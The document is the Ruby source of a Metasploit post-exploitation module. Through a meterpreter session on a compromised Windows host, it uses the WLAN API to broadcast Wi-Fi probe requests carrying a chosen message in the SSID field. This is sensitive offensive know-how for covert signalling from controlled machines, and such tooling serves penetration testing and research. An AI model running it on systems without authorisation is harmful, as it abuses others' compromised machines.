##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Send Probe Request Packets',
      'Description'   => %q{
        This module send probe requests through the wlan interface.
        The ESSID field will be use to set a custom message.
        },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Borja Merino <bmerinofe[at]gmail.com>' ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
    [
      OptString.new('SSID', [true,  'Message to be embedded in the SSID field', '']),
      OptInt.new('TIMEOUT', [false, 'Timeout in seconds running probes', '30'])
    ])
  end

  def run
    ssid = datastore['SSID']
    time = datastore['TIMEOUT']

    if ssid.length > 32
      print_error("The SSID must be equal to or less than 32 bytes")
      return
    end

    mypid = client.sys.process.getpid
    @host_process = client.sys.process.open(mypid, PROCESS_ALL_ACCESS)
    @wlanapi = client.railgun.wlanapi

    wlan_handle = open_handle()
    unless wlan_handle
      print_error("Couldn't open WlanAPI Handle. WLAN API may not be installed on target")
      print_error("On Windows XP this could also mean the Wireless Zero Configuration Service is turned off")
      return
    end

    # typedef struct _DOT11_SSID {
    #    ULONG uSSIDLength;
    #    UCHAR ucSSID[DOT11_SSID_MAX_LENGTH];
    # } DOT11_SSID, *PDOT11_SSID;
    pDot11Ssid = [ssid.length].pack("L<") << ssid
    wlan_iflist = enum_interfaces(wlan_handle)
    if wlan_iflist.length == 0
      print_status("Wlan interfaces not found")
      return
    end

    print_status("Wlan interfaces found: #{wlan_iflist.length}")
    print_status("Sending probe requests for #{time} seconds")
    begin
      ::Timeout.timeout(time) do
        while true
          wlan_iflist.each do |interface|
            vprint_status("Interface Guid: #{interface['guid'].unpack('H*')[0]}")
            vprint_status("Interface State: #{interface['state']}")
            vprint_status("DOT11_SSID payload: #{pDot11Ssid.chars.map {|c| c.ord.to_s(16) }.join(':')}")
            @wlanapi.WlanScan(wlan_handle,interface['guid'],pDot11Ssid,nil,nil)
            sleep(10)
          end
        end
      end
    rescue ::Timeout::Error
      closehandle = @wlanapi.WlanCloseHandle(wlan_handle,nil)
      if closehandle['return'] == 0
        print_status("WlanAPI Handle closed successfully")
      else
        print_error("There was an error closing the Handle")
      end
    end
  end

  # Function borrowed from @theLightCosine wlan_* modules
  def open_handle
    begin
      wlhandle = @wlanapi.WlanOpenHandle(2,nil,4,4)
    rescue
      return nil
    end
    return wlhandle['phClientHandle']
  end

  # Function borrowed from @theLightCosine wlan_* modules
  def enum_interfaces(wlan_handle)

    iflist = @wlanapi.WlanEnumInterfaces(wlan_handle,nil,4)
    pointer= iflist['ppInterfaceList']

    numifs = @host_process.memory.read(pointer,4)
    numifs = numifs.unpack("V")[0]

    interfaces = []

    #Set the pointer ahead to the first element in the array
    pointer = (pointer + 8)
    (1..numifs).each do |i|
      interface = {}
      #Read the GUID (16 bytes)
      interface['guid'] = @host_process.memory.read(pointer,16)
      pointer = (pointer + 16)
      #Read the description(up to 512 bytes)
      interface['description'] = @host_process.memory.read(pointer,512)
      pointer = (pointer + 512)
      #Read the state of the interface (4 bytes)
      state = @host_process.memory.read(pointer,4)
      pointer = (pointer + 4)
      #Turn the state into human readable form
      state = state.unpack("V")[0]
      case state
        when 0
          interface['state'] = "The interface is not ready to operate."
        when 1
          interface['state'] = "The interface is connected to a network."
        when 2
          interface['state'] = "The interface is the first node in an ad hoc network. No peer has connected."
        when 3
          interface['state'] = "The interface is disconnecting from the current network."
        when 4
          interface['state'] = "The interface is not connected to any network."
        when 5
          interface['state'] = "The interface is attempting to associate with a network."
        when 6
          interface['state'] = "Auto configuration is discovering the settings for the network."
        when 7
          interface['state'] = "The interface is in the process of authenticating."
        else
          interface['state'] = "Unknown State"
      end
      interfaces << interface
    end
    return interfaces
  end
end
